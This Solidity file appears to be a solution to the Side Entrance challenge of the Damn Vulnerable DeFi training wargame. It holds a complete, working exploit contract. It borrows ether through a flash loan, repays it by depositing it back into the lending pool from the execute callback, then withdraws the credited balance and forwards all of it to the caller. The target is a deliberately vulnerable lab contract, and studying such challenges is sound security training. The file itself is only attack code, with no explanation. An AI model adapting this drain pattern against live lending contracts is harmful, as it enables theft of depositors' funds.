pragma solidity ^0.8.0;

import "../Problems/damnvulnerabledefi/4/SideEntranceLenderPool.sol";

contract AttackSideEntranceLenderPool is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool pool;
    constructor(SideEntranceLenderPool poolInstance){
        pool = poolInstance;
    }
    function attack(uint256 amount) payable external {
        pool.flashLoan(amount * 10 ** 18);
        pool.withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }

    function execute() external override payable {
        pool.deposit{value: msg.value}();
    }
    receive() payable external {}
}
